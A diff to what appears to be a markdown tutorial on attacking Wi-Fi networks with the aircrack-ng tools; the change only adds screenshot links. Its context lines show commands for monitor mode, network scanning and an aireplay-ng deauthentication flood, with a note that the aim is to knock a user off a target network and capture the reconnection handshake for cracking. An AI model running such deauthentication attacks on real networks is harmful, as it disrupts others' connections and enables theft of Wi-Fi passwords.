@@ -29,6 +29,9 @@
 ┌──(root💀kali)-[~]
 └─# airmon-ng start wlan0
 ```
+<a href="https://i.hizliresim.com/jr314du.png">Airmon</a>
+<a href="https://i.hizliresim.com/74x8rav.png">iwconfig</a>
+
 `Turning off monitor mode`, example usage:
 - `airmon-ng stop <interface>`
 ```
@@ -44,6 +47,7 @@
 ┌──(root💀kali)-[~]
 └─# airodump-ng wlan0mon
 ```
+<a href="https://www.hizliresim.com/jemkzmg.png">Airodump</a>
 
 ```
 BSSID = MAC Address
@@ -73,6 +77,7 @@ Example airodump-ng usage:
 ┌──(root💀kali)-[~]
 └─# aireplay-ng --deauth 10000 -a 0A:1B:2C:3D:4E:5F -c 0A:1B:2C:3D:4E:5F wlan0mon
 ```
+<a href="https://www.hizliresim.com/bfjo2y6.png">Aireplay</a>
 
 NOTE: Our goal here is to remove the user connected to our target network from the network and reconnect, and to capture and decrypt the encrypted numbers that occur in the air when the user wants to reconnect to the network.
 
